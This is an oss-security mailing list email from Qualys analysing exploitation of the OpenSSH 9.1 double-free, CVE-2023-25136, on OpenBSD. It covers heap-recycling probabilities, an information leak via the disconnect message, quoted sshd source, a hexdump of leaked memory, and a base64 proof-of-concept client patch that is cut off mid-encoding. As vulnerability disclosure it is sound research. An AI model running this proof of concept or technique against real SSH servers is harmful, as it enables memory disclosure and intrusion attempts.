Received: (qmail 7926 invoked by uid 550); 22 Feb 2023 05:54:54 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 7903 invoked from network); 22 Feb 2023 05:54:53 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qualys.com; h=from : to : subject :
 date : message-id : references : in-reply-to : content-type :
 mime-version; s=qualyscom;
 bh=+Toq6Ugv0rqn8+STOzzxRjk7WUz+vLgvbHpqblYgzdU=;
 b=roZCBhkM6dS8vXgwy9eCK1+bNuwqehCTXmb0Vv2cZY1l8N/abF+vosilbvYfoXBJpHLG
 igKPm6/Ibbbh5jRj5zZSvc29QCHBNe6AOUu126q8UawVcMYgV8lV1nNoKrMX+5EjL9hw
 PJKggBa7LNeqw2K517iSAkTIYbz9mtFkPHxP+NHO0D0VHyMwWl8GlxHAclMe+eGArZd7
 zpdCLCvWRcgg6niR4RHIqnXUpU53ueNhF3gYDMX5udcoDtMOe19AMov2KzSGrG5Lhg8U
 Z9mQia63PIXKzVFEG0zJbIgi+qTSZ0UbTkhGpiaRfcWOV18sf55a4rjq7BaipbJXAljT 2w== 
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=lSPvb2Xe4XhTADoldx1E6uK20u5sgSYt9SXiKpCYPi4zVAxE8dFDF8seFVGZK4A3Lr/viFCitOGzErRAOGWuJoyWmmvqTFqHQth+cF5x0+rYUASCMBHGRLqqHAkCDO2Jko478s2qtXyl29po9/gGIN2hxae/k03IxdNL87lChASsnUsHihnVaGfzOkjrYNsSa24rXpR4PZRU6swD9GiMLPNdO8iBN7CyDBF+rIHohA5LLed7alue8RSyRLjJiMXY7aMBsMVV5eJHdt8+6x4Yy6CBbXcnlLGM86wrBZVUHsbgUPPKkePGy3Dm79xESSNtv+rm3mwznvF3RJfm2yaG3w==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=+Toq6Ugv0rqn8+STOzzxRjk7WUz+vLgvbHpqblYgzdU=;
 b=TzYdrjsghlyg82h3abRPfz5okYKMBMGk+N7H7qz1BSDT3abm066UEofX6WERYMvsuGlrSRXAI5zqmvuxEGV+iz/Y4t5L0e0l2YXd2HKONKo48u1y61JxBDI40UXnBvlTpAbGAaFBi6/c5AWkj5Hg0ewN8gUyDS5+F9RsYW4cjmos9gn4b/x39lKl+/zAitDnRHohpvx8th3GNBOXGGKBBFDnEUEC4vk2Jat45bL3vnxzJ5BXPhBZmrjaqojlIlz8xf+lf0N1LoJrALXkkiZ3WvjREnQ/R7vZErqhUSLzXkftoM9jcPMWTkBUk53mNFghMur9dkNoeQCxRRUaMSNgBQ==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=qualys.com; dmarc=pass action=none header.from=qualys.com;
 dkim=pass header.d=qualys.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=qualys.onmicrosoft.com; s=selector1-qualys-onmicrosoft-com;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=+Toq6Ugv0rqn8+STOzzxRjk7WUz+vLgvbHpqblYgzdU=;
 b=i3zJGrJasL2mwynLU06EjmRgnc9EDADH3UwiCNd8F0KwFWvXgGlWpNHmSAycL44Iu5jjA+cNegFcdCdqF0jFkUfEc0G8Fwg0IPJYkndWWzj9RQYYa05lkWTIThLo4TKkaXa4/YpIlRH9ePTGIzazUS6L3mPh6leFHPvT4inhXt9hTWW8u+y7i/4u01b5bZd/WaEC76MfM9uzXJFVOf8LFWkBf8zg58glanH3PpgA57WW6pKtOzTQNtSQHRn/XHqeiz8aLgJ9yvjaDbHNi3dDN7g8D/xUZs4onGcSotURhNnIjl9ANwxPC9AWxnz2ANlqvrmBPWVTH9DiMk/c+TCWXQ==
From: Qualys Security Advisory <qsa@qualys.com>
To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
Thread-Topic: double-free vulnerability in OpenSSH server 9.1 (CVE-2023-25136)
Thread-Index: AQHZP6MCIrfQwQnS6U23aTWiygrAQK7ahPwA
Date: Wed, 22 Feb 2023 05:54:36 +0000
Message-ID: <20230222055430.GA32113@localhost.localdomain>
References: <20230202130212.GA15689@localhost.localdomain>
 <20230213120214.GB19824@localhost.localdomain>
In-Reply-To: <20230213120214.GB19824@localhost.localdomain>
Accept-Language: en-US
Content-Language: en-US
X-MS-Has-Attach: yes
X-MS-TNEF-Correlator: 
x-ms-publictraffictype: Email
x-ms-traffictypediagnostic: SJ0PR06MB6910:EE_|SA1PR06MB8087:EE_
x-ms-office365-filtering-correlation-id: 025db491-bbf6-48f0-9303-08db14994751
x-ms-exchange-senderadcheck: 1
x-ms-exchange-antispam-relay: 0
x-microsoft-antispam: BCL:0;
x-microsoft-antispam-message-info: 
 l/uul0IDJAw1MuL9WdpTJo1ClM/+a024/FuIxywLslrGv+w+InO4IrtQeZMHkZsK8AhZabSe3eGn4pKV5FiW9pKqzulF6q8lMdwNkHHAL3Mypl9YIXPr/wcxVpHbFYipoXl/PpQttI3r7WyuPCwIkKQ0xV0q0MSlW09fpZT/kFq5oqy3jgsGbcgwsr/0VduHJicoPeJD7I4gyI+xro8eezyO92WQ8wmC5X4/nUyG3RkvAWls2d/buOHOOCQgkIj4URH3HtwWTyjWd3NqBDQ98lwsF3p1U+x/yKlrAettUxGBWtHLs7PYbSsB/AeZSMwqilGbgLbao1RHxJVpS6mI2eyg6QMvRHlLgZVD0+4zTO9RUVhrfc8CrEwbZSPTxgTE+9fBZ4ykcDjbUtRBBONsH3S73yn/K8/V8rI65AHh3Rm8ITfzHhNzU2RtZdzMu+YIB/Cx9SAZ5GkxGKyw7yD8vvN0UEcxO9DxjTyTgRZwtQl5lUMvAgLXB64L6PrKKJxHw6ibHCdDi9ujLtZpDs7KGrHgqZSmFXRkweISRFCIZMgQ99u35ImuDgZqd6NmvwPvdTqI2QS1LlF3X93WotH1jpRoWFkYIzVeCc6ve/lKvK4HM/F89d7LTIlujZhFRy5OR4cruvCvSi4H0jG7hPnGPUNRLUmVCQE572oLMYumi4FOP31DKdRu8gv8VdfMaK8CXG0+OV19oxTN1V1HAdJmkVdwOygL57HorTSOYAseK9k=
x-forefront-antispam-report: 
 CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:SJ0PR06MB6910.namprd06.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230025)(39860400002)(376002)(136003)(346002)(366004)(396003)(451199018)(83380400001)(26005)(316002)(6486002)(71200400001)(9686003)(186003)(1076003)(6506007)(6512007)(55236004)(33656002)(478600001)(8936002)(38100700002)(86362001)(38070700005)(5660300002)(2906002)(91956017)(41300700001)(122000001)(99936003)(6916009)(8676002)(64756008)(66446008)(66476007)(66556008)(66946007)(76116006)(47845001);DIR:OUT;SFP:1102;
x-ms-exchange-antispam-messagedata-chunkcount: 1
x-ms-exchange-antispam-messagedata-0: 
 =?us-ascii?Q?FYqKMdrFHqliCmI8PGuCyfV7MYBzMjveF8QaCpmS5eDa+QhO1NaYkjZzkDSH?=
 =?us-ascii?Q?Y/9n5NNb3bGfpNJXBGhEUxJv7jbALvPM1UYAg/1QOTVPRDriaI+b563GOWWk?=
 =?us-ascii?Q?eoRBn2W1XuF1JowYocFhjNp9mgXA1C4k906dMGBMQR4lRSFTgMBKDdLIsL6v?=
 =?us-ascii?Q?3bZa0Ep+1zzLoq3UCQa2vxuq3+pVKDwS5sVkZFeU9zEP4CDc3OPSsbSnw7Uc?=
 =?us-ascii?Q?G4OwiRcbnTJluvapW+to83scgsrj6kAwwK6U25IgvHF8mwM4aKoia67T/jT8?=
 =?us-ascii?Q?og1eRd3BMT/bZ8JZBKlZXs6YwoKIv3UtXHupD51UnMrNvrMlHf/UPJSn2Ebm?=
 =?us-ascii?Q?B6sryIArZH0QF6cQk9r9mIMNehobHLau4feuLd5Vycx6cCKy27QhYT5WN80B?=
 =?us-ascii?Q?Rl4zLi/wuYAADM6+E9EwTm8Rm5fRIIVZEfVF2Zx9QhxhS9tlFQb6Zow1H9/R?=
 =?us-ascii?Q?ZDkqeGoXg3xTx2SqQAAR7BBTV97oKNlE6I3jajj1F4mYk0vLkTo9k1xRy6li?=
 =?us-ascii?Q?CAhO2lVO1ORXV95kdJLeak67KMTkSL/l04GexmfB1sm6bWM2QG02YwA36q49?=
 =?us-ascii?Q?v5UNqHEQPwbk3aT9RuR4t2PduMPc9mCcENEFN30gMheZ8QRPzQm1jCcYxmiT?=
 =?us-ascii?Q?kgXHmDuDg/vocUT2g2nilUYxr2LT+LwjiAgFVv2tMHjn02vhVHdQREc811Sj?=
 =?us-ascii?Q?YdMGjv/XHmwwvdHOHZypdyWdpbCrPzDC33aTYJysRIHfmW1C6oh+drBY91jR?=
 =?us-ascii?Q?Wz0bIpGUYjToYlrXZhsPFloe2PUoNdcuX6LtYDlezwhLBY9HfPlKYETOCTpE?=
 =?us-ascii?Q?BSusQRuIktOn7efuo7dqQu5mDIyA7auB5ONB6G7c3mv+TF3gCSiAoYOY78Ik?=
 =?us-ascii?Q?Ya4yPdamiolmDevEu5uyS9d+kmFGuiQ3ccwWL9Vja9JcljFpTAzq2rGTfxwo?=
 =?us-ascii?Q?HYARk7+0xmhbwiO7+FW7trtxhffVzgB8NG2XjUXaIB+kIbwekHQVTVkbPkdt?=
 =?us-ascii?Q?CaV8wqAl+TAF6JIRH6lhjj2nlwjZ+2o86UXs9ya+YvHyF7T/sGurPir0jFnc?=
 =?us-ascii?Q?8e9s/W9ixy9j5H0uUgjLn/Ws8ZPLTezFK/ehiyzVYblOUAqnXFEfmhJHj/vN?=
 =?us-ascii?Q?RohlltAxvZuPlPwkMJYHylHa9tOJbgQSP8nRV2a0uctPloo3CS9C4ZYmgI6L?=
 =?us-ascii?Q?eeu5dWyJKBYvqABenSN5TeNqgDbGBLFGeMWMr1qz+SUcZZkcEg+b8i71X2eM?=
 =?us-ascii?Q?pAV1zZDe8dM4/klmpaAEv65ZKmo0j3yjlhMfLEsHxlGKpC2bc+AYm9olkkqg?=
 =?us-ascii?Q?MCjlT29ROVFu9Yh5gckQiu5uoUxX3/9ZpXJNxO0yhqg/J2TC1/mM+pOW43B/?=
 =?us-ascii?Q?pkKTHPHFVnfwfdaDLYTg+CvPRfW49b9nDymbzX6euePk5Z2vNQ3SQR+XFxde?=
 =?us-ascii?Q?MDVEnv5gkoMqqLLi77hS+tExqVIwMk6ZKzrrn9W/dPWcw9tlUAsdPXPGntAt?=
 =?us-ascii?Q?SNZNY/tHpsmArsb7BZkTK6OZzwtzFhR0REggOq0qZuntRcSgBQzL2AHAMmvE?=
 =?us-ascii?Q?t8aBPRTmx//j/+j56svM3HgEG++McHmaIzzj9Y0y9lhArP+qKZb0dzj8Nltd?=
 =?us-ascii?Q?wrUC87teL/JXo4k1LLwijRo=3D?=
Content-Type: multipart/mixed;
	boundary="_002_20230222055430GA32113localhostlocaldomain_"
MIME-Version: 1.0
X-OriginatorOrg: qualys.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-AuthSource: SJ0PR06MB6910.namprd06.prod.outlook.com
X-MS-Exchange-CrossTenant-Network-Message-Id: 025db491-bbf6-48f0-9303-08db14994751
X-MS-Exchange-CrossTenant-originalarrivaltime: 22 Feb 2023 05:54:36.1657
 (UTC)
X-MS-Exchange-CrossTenant-fromentityheader: Hosted
X-MS-Exchange-CrossTenant-id: 81a9ef9a-9a98-4b00-886a-895a603bc029
X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
X-MS-Exchange-CrossTenant-userprincipalname: 6HG59wjUnU2ou2VUKlr/cMYf5NIUVK0rDcoSGM6j4jD71WkRGn8FQ3U0XiMxaLIr/WYBG2hO9pILSbNDYzpYq6rlH/X9LBikufoUdv7Zm6o=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: SA1PR06MB8087
X-Proofpoint-Virus-Version: vendor=baseguard
 engine=ICAP:2.0.205,Aquarius:18.0.930,Hydra:6.0.562,FMLib:17.11.170.22
 definitions=2023-02-22_02,2023-02-20_02,2023-02-09_01
Subject: [oss-security] Re: double-free vulnerability in OpenSSH server 9.1 (CVE-2023-25136)

--_002_20230222055430GA32113localhostlocaldomain_
Content-Type: text/plain; charset="us-ascii"
Content-ID: <C8BF6BEA1570FB4196DB6D60178590E5@namprd06.prod.outlook.com>
Content-Transfer-Encoding: quoted-printable

Hi all,

Another quick update on the exploitation of this double-free bug on
OpenBSD:

a/ our previous attack (the arbitrary control of sshd's instruction
pointer via the EVP_AES_KEY structure) works only on OpenBSD amd64, not
on OpenBSD i386;

b/ we were able to recycle the chunk of memory where
options.kex_algorithms was allocated, into a chunk of a different size
(which gives us greater freedom), but this happens with such a low
probability (even on i386) that we do not consider this particular
attack to be practical;

c/ as a direct consequence of CVE-2023-25136, we found an information
leak (of bits and pieces from the memory of the unprivileged sshd
process), but it is unlikely to be useful in practice.

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
a/ Our previous attack, on OpenBSD i386.

options.kex_algorithms is a 266-byte string, which occupies a 512-byte
chunk of memory. On OpenBSD amd64, we can re-allocate this chunk (after
it is freed for the first time) with a struct EVP_AES_KEY, whose size is
264 bytes and therefore also requires a 512-byte chunk of memory.

But on OpenBSD i386, the size of a struct EVP_AES_KEY is only 252 bytes,
and it therefore requires a 256-byte chunk instead; i.e., we cannot
easily re-allocate options.kex_algorithms's chunk with a struct
EVP_AES_KEY.

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
b/ The recycling of options.kex_algorithms's chunk.

One solution to the previous problem (on OpenBSD i386) is to recycle
options.kex_algorithms's 512-byte chunk, into a 256-byte chunk; i.e.,
recycle the page of memory where options.kex_algorithms was allocated,
into a page of 256-byte chunks instead. To achieve this:

- options.kex_algorithms must be allocated in an otherwise empty page
  of memory (so that, after options.kex_algorithms is freed, this empty
  page can be re-used for chunks of a different size). Luckily, because
  options.kex_algorithms is allocated randomly from several pages of
  memory, this does happen from time to time, with a probability of
  ~1/512 in our tests.

- This empty page must then be re-used for chunks of a different size,
  but sshd enables malloc's "secure" mode (malloc_options =3D "S"): empty
  pages are not cached by malloc but are immediately munmap()ed, and the
  re-mmap()ing of a page at the exact same address is therefore subject
  to AS(L)R. This happens with a probability of ~1/2^18 at best (unlike
  Linux, OpenBSD randomizes every single mmap() address, in a 1GB range
  on i386).

- Inside this recycled page, our target chunk must be allocated exactly
  where options.kex_algorithms was allocated. For a 256-byte target
  chunk, this happens with a probability of 1/16.

As a result, the probability of recycling options.kex_algorithms's chunk
into a 256-byte chunk is ~1/2^31 at best, so we do not consider this
particular attack to be practical.

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
c/ A useless (?) information leak.

After options.kex_algorithms's chunk is freed for the first time (in
compat_kex_proposal()), sshd enters input_userauth_request():

------------------------------------------------------------------------
250 static int
251 input_userauth_request(int type, u_int32_t seq, struct ssh *ssh)
252 {
...
262         if ((r =3D sshpkt_get_cstring(ssh, &user, NULL)) !=3D 0 ||
263             (r =3D sshpkt_get_cstring(ssh, &service, NULL)) !=3D 0 ||
264             (r =3D sshpkt_get_cstring(ssh, &method, NULL)) !=3D 0)
265                 goto out;
...
274         if (authctxt->attempt++ =3D=3D 0) {
275                 /* setup auth context */
276                 authctxt->pw =3D PRIVSEP(getpwnamallow(ssh, user));
...
289                 authctxt->user =3D xstrdup(user);
290                 authctxt->service =3D xstrdup(service);
...
298         } else if (strcmp(user, authctxt->user) !=3D 0 ||
299             strcmp(service, authctxt->service) !=3D 0) {
300                 ssh_packet_disconnect(ssh, "Change of username or servi=
ce "
301                     "not allowed: (%s,%s) -> (%s,%s)",
302                     authctxt->user, authctxt->service, user, service);
303         }
...
328  out:
329         free(service);
330         free(user);
331         free(method);
332         return r;
333 }
------------------------------------------------------------------------

- at lines 262-264, we re-allocate options.kex_algorithms's chunk with
  our user, service, or method string (a 300-byte string, which requires
  a 512-byte chunk, just like options.kex_algorithms);

- at line 276, options.kex_algorithms's chunk (now our user, service, or
  method string) is freed again;

- at lines 289-290, we re-allocate options.kex_algorithms's chunk again,
  with either authctxt->user or authctxt->service (a copy of our user or
  service string);

- at lines 329-331, options.kex_algorithms's chunk (now authctxt->user
  or authctxt->service) is freed again (via user, service, or method);

- when sshd enters input_userauth_request() for the second time, either
  user or service does not match (at lines 298-299), and the contents of
  the free authctxt->user or authctxt->service chunk is sent to us (at
  lines 300-302).

Initially, we thought that this information leak would not leak any
information at all, because OpenBSD's malloc (when in "secure" mode)
overwrites the contents of free chunks with 0xdf bytes. Nevertheless,
because the authctxt->user or authctxt->service chunk is sent to us as a
null-terminated string (%s), and because this chunk does not contain any
null bytes (only 0xdf bytes), the chunk that follows authctxt->user or
authctxt->service is also sent to us, and might contain interesting
pieces of information (because it can be an allocated chunk).

Our proof of concept (a simple patch for openssh-9.1p1) is attached to
this email. We have not fully analyzed its output yet (disconnect.log),
but we do not expect it to be particularly useful, because of sshd's
defense-in-depth mechanisms:

- the memory of the unprivileged sshd process (where the information
  leak occurs) is not supposed to contain any secret information (for
  example, the private host keys are scrubbed from the memory of the
  unprivileged sshd process as soon as it is fork()ed, in
  demote_sensitive_data());

- any leaked memory address is mostly useless (except maybe for its
  least significant bits), because sshd calls _exit() at the end of
  ssh_packet_disconnect() (at lines 300-302), and because sshd fork()s
  and re-execv()s itself (and therefore re-randomizes its address space)
  every time it accept()s a new client connection.

As an example, below is an excerpt from a disconnect.log that was
produced when running our proof of concept against an unpatched OpenBSD
7.2 (on amd64):

------------------------------------------------------------------------
$ while true ;do ./ssh invalid@192.168.56.123 ;done
...

$ hexdump -C disconnect.log
...
000280d0  00 43 68 61 6e 67 65 20  6f 66 20 75 73 65 72 6e  |.Change of use=
rn|
000280e0  61 6d 65 20 6f 72 20 73  65 72 76 69 63 65 20 6e  |ame or service=
 n|
000280f0  6f 74 20 61 6c 6c 6f 77  65 64 3a 20 28 df df df  |ot allowed: (.=
..|
00028100  df df df df df df df df  df df df df df df df df  |..............=
..|
*
000282f0  df df df df df df df df  df df df df df 29 4e 90  |.............)=
N.|
00028300  92 98 14 ff b0 35 d4 f8  f8 59 db 0a ba 43 99 95  |.....5...Y...C=
..|
00028310  70 6d 2d 2a 5e 85 fe 22  ff 1c 92 19 3b 4e 6d 58  |pm-*^.."....;N=
mX|
00028320  4b 82 2f bd 97 1e 8c 0d  ab 61 4f 76 9b 4b c2 6b  |K./......aOv.K=
.k|
00028330  91 f1 25 c5 5e c2 12 79  d5 a9 56 7f 10 18 e2 71  |..%.^..y..V...=
.q|
00028340  f5 0c c7 9c d0 08 61 82  18 36 66 eb cf af d0 60  |......a..6f...=
.`|
00028350  e9 e0 af 86 5d 07 2c df  df df df df df df df df  |....].,.......=
..|
00028360  df df df df df df df df  df df df df df df df df  |..............=
..|
...
------------------------------------------------------------------------

We are at your disposal for questions, comments, and further
discussions. Thank you very much!

With best regards,

--=20
the Qualys Security Advisory team

--_002_20230222055430GA32113localhostlocaldomain_
Content-Type: text/plain; name="infoleak.patch"
Content-Description: infoleak.patch
Content-Disposition: attachment; filename="infoleak.patch"; size=3639;
	creation-date="Wed, 22 Feb 2023 05:54:36 GMT";
	modification-date="Wed, 22 Feb 2023 05:54:36 GMT"
Content-ID: <7399ACEE210A9F4CA8DFBF5DF80332F2@namprd06.prod.outlook.com>
Content-Transfer-Encoding: base64

ZGlmZiAtcHVyciBvcGVuc3NoLTkuMXAxL3BhY2tldC5jIG9wZW5zc2gtOS4x
cDEtaW5mb2xlYWsvcGFja2V0LmMNCi0tLSBvcGVuc3NoLTkuMXAxL3BhY2tl
dC5jCTIwMjItMTAtMDMgMDc6NTE6NDIuMDAwMDAwMDAwIC0wNzAwDQorKysg
b3BlbnNzaC05LjFwMS1pbmZvbGVhay9wYWNrZXQuYwkyMDIzLTAyLTIxIDE4
OjA4OjU3Ljk1NDA0OTU5MiAtMDgwMA0KQEAgLTYzLDYgKzYzLDggQEANCiAj
ZW5kaWYNCiAjaW5jbHVkZSA8c2lnbmFsLmg+DQogI2luY2x1ZGUgPHRpbWUu
aD4NCisjaW5jbHVkZSA8c3lzL3N0YXQuaD4NCisjaW5jbHVkZSA8ZmNudGwu
aD4NCiANCiAvKg0KICAqIEV4cGxpY2l0bHkgaW5jbHVkZSBPcGVuU1NMIGJl
Zm9yZSB6bGliIGFzIHNvbWUgdmVyc2lvbnMgb2YgT3BlblNTTCBoYXZlDQpA
QCAtMTczNSw5ICsxNzM3LDIyIEBAIHNzaF9wYWNrZXRfcmVhZF9wb2xsX3Nl
cW5yKHN0cnVjdCBzc2ggKnMNCiAJCQlmcmVlKG1zZyk7DQogCQkJYnJlYWs7
DQogCQljYXNlIFNTSDJfTVNHX0RJU0NPTk5FQ1Q6DQorCQkgICAgew0KKwkJ
CXNpemVfdCBsZW4gPSAwOw0KIAkJCWlmICgociA9IHNzaHBrdF9nZXRfdTMy
KHNzaCwgJnJlYXNvbikpICE9IDAgfHwNCi0JCQkgICAgKHIgPSBzc2hwa3Rf
Z2V0X3N0cmluZyhzc2gsICZtc2csIE5VTEwpKSAhPSAwKQ0KKwkJCSAgICAo
ciA9IHNzaHBrdF9nZXRfc3RyaW5nKHNzaCwgJm1zZywgJmxlbikpICE9IDAp
DQogCQkJCXJldHVybiByOw0KKwkJCWlmIChsZW4pIHsNCisJCQkJY29uc3Qg
aW50IGZkID0gb3BlbigiZGlzY29ubmVjdC5sb2ciLA0KKwkJCQkgICAgT19X
Uk9OTFkgfCBPX0NSRUFUIHwgT19BUFBFTkQgfCBPX05PRk9MTE9XLCAwNjAw
KTsNCisJCQkJaWYgKGZkID49IDApIHsNCisJCQkJCXN0YXRpYyBjb25zdCBj
aGFyIHplcm9zWzY0XTsNCisJCQkJCXdyaXRlKGZkLCBtc2csIGxlbik7DQor
CQkJCQl3cml0ZShmZCwgemVyb3MsIHNpemVvZih6ZXJvcykpOw0KKwkJCQkJ
Y2xvc2UoZmQpOw0KKwkJCQl9DQorCQkJfQ0KKwkJICAgIH0NCiAJCQkvKiBJ
Z25vcmUgbm9ybWFsIGNsaWVudCBleGl0IG5vdGlmaWNhdGlvbnMgKi8NCiAJ
CQlkb19sb2cyKHNzaC0+c3RhdGUtPnNlcnZlcl9zaWRlICYmDQogCQkJICAg
IHJlYXNvbiA9PSBTU0gyX0RJU0NPTk5FQ1RfQllfQVBQTElDQVRJT04gPw0K
ZGlmZiAtcHVyciBvcGVuc3NoLTkuMXAxL3NzaGNvbm5lY3QyLmMgb3BlbnNz
aC05LjFwMS1pbmZvbGVhay9zc2hjb25uZWN0Mi5jDQotLS0gb3BlbnNzaC05
LjFwMS9zc2hjb25uZWN0Mi5jCTIwMjItMTAtMDMgMDc6NTE6NDIuMDAwMDAw
MDAwIC0wNzAwDQorKysgb3BlbnNzaC05LjFwMS1pbmZvbGVhay9zc2hjb25u
ZWN0Mi5jCTIwMjMtMDItMjEgMTY6NDk6NDQuNjY1MTM0NzE0IC0wODAwDQpA
QCAtMjIyLDcgKzIyMiw3IEBAIHNzaF9rZXgyKHN0cnVjdCBzc2ggKnNzaCwg
Y2hhciAqaG9zdCwgc3QNCiAgICAgY29uc3Qgc3RydWN0IHNzaF9jb25uX2lu
Zm8gKmNpbmZvKQ0KIHsNCiAJY2hhciAqbXlwcm9wb3NhbFtQUk9QT1NBTF9N
QVhdID0geyBLRVhfQ0xJRU5UIH07DQotCWNoYXIgKnMsICphbGxfa2V5Ow0K
KwljaGFyICphbGxfa2V5Ow0KIAljaGFyICpwcm9wX2tleCA9IE5VTEwsICpw
cm9wX2VuYyA9IE5VTEwsICpwcm9wX2hvc3RrZXkgPSBOVUxMOw0KIAlpbnQg
ciwgdXNlX2tub3duX2hvc3RzX29yZGVyID0gMDsNCiANCkBAIC0yNDcsOSAr
MjQ3LDcgQEAgc3NoX2tleDIoc3RydWN0IHNzaCAqc3NoLCBjaGFyICpob3N0
LCBzdA0KIAkJZmF0YWxfZnIociwgImtleF9hc3NlbWJsZV9uYW1lbGlzdCIp
Ow0KIAlmcmVlKGFsbF9rZXkpOw0KIA0KLQlpZiAoKHMgPSBrZXhfbmFtZXNf
Y2F0KG9wdGlvbnMua2V4X2FsZ29yaXRobXMsICJleHQtaW5mby1jIikpID09
IE5VTEwpDQotCQlmYXRhbF9mKCJrZXhfbmFtZXNfY2F0Iik7DQotCW15cHJv
cG9zYWxbUFJPUE9TQUxfS0VYX0FMR1NdID0gcHJvcF9rZXggPSBjb21wYXRf
a2V4X3Byb3Bvc2FsKHNzaCwgcyk7DQorCW15cHJvcG9zYWxbUFJPUE9TQUxf
S0VYX0FMR1NdID0gcHJvcF9rZXggPSB4c3RyZHVwKG9wdGlvbnMua2V4X2Fs
Z29yaXRobXMpOw0KIAlteXByb3Bvc2FsW1BST1BPU0FMX0VOQ19BTEdTX0NU
T1NdID0NCiAJICAgIG15cHJvcG9zYWxbUFJPUE9TQUxfRU5DX0FMR1NfU1RP
Q10gPSBwcm9wX2VuYyA9DQogCSAgICBjb21wYXRfY2lwaGVyX3Byb3Bvc2Fs
KHNzaCwgb3B0aW9ucy5jaXBoZXJzKTsNCkBAIC0xMDUxLDE0ICsxMDQ5LDE4
IEBAIGlucHV0X2dzc2FwaV9lcnJvcihpbnQgdHlwZSwgdV9pbnQzMl90IHAN
CiBzdGF0aWMgaW50DQogdXNlcmF1dGhfbm9uZShzdHJ1Y3Qgc3NoICpzc2gp
DQogew0KLQlBdXRoY3R4dCAqYXV0aGN0eHQgPSAoQXV0aGN0eHQgKilzc2gt
PmF1dGhjdHh0Ow0KIAlpbnQgcjsNCisJc3RhdGljIGNvbnN0IGNoYXIga2V4
W10gPSAiZWNkaC1zaGEyLW5pc3RwMjU2LCI7DQorCWNoYXIgYnVmWzMwMF07
DQorCW1lbXNldChidWYsICdBJywgc2l6ZW9mKGJ1ZiktMSk7DQorCW1lbWNw
eShidWYsIGtleCwgc2l6ZW9mKGtleCktMSk7DQorCWJ1ZltzaXplb2YoYnVm
KS0xXSA9ICdcMCc7DQogDQogCS8qIGluaXRpYWwgdXNlcmF1dGggcmVxdWVz
dCAqLw0KIAlpZiAoKHIgPSBzc2hwa3Rfc3RhcnQoc3NoLCBTU0gyX01TR19V
U0VSQVVUSF9SRVFVRVNUKSkgIT0gMCB8fA0KLQkgICAgKHIgPSBzc2hwa3Rf
cHV0X2NzdHJpbmcoc3NoLCBhdXRoY3R4dC0+c2VydmVyX3VzZXIpKSAhPSAw
IHx8DQotCSAgICAociA9IHNzaHBrdF9wdXRfY3N0cmluZyhzc2gsIGF1dGhj
dHh0LT5zZXJ2aWNlKSkgIT0gMCB8fA0KLQkgICAgKHIgPSBzc2hwa3RfcHV0
X2NzdHJpbmcoc3NoLCBhdXRoY3R4dC0+bWV0aG9kLT5uYW1lKSkgIT0gMCB8
fA0KKwkgICAgKGJ1ZltzaXplb2Yoa2V4KS0xXSA9ICd1JywgKHIgPSBzc2hw
a3RfcHV0X2NzdHJpbmcoc3NoLCBidWYpKSAhPSAwKSB8fA0KKwkgICAgKGJ1
ZltzaXplb2Yoa2V4KS0xXSA9ICdzJywgKHIgPSBzc2hwa3RfcHV0X2NzdHJp
bmcoc3NoLCBidWYpKSAhPSAwKSB8fA0KKwkgICAgKGJ1ZltzaXplb2Yoa2V4
KS0xXSA9ICdtJywgKHIgPSBzc2hwa3RfcHV0X2NzdHJpbmcoc3NoLCBidWYp
KSAhPSAwKSB8fA0KIAkgICAgKHIgPSBzc2hwa3Rfc2VuZChzc2gpKSAhPSAw
KQ0KIAkJZmF0YWxfZnIociwgInNlbmQgcGFja2V0Iik7DQogCXJldHVybiAx
Ow0KZGlmZiAtcHVyciBvcGVuc3NoLTkuMXAxL3ZlcnNpb24uaCBvcGVuc3No
LTkuMXAxLWluZm9sZWFrL3ZlcnNpb24uaA0KLS0tIG9wZW5zc2gtOS4xcDEv
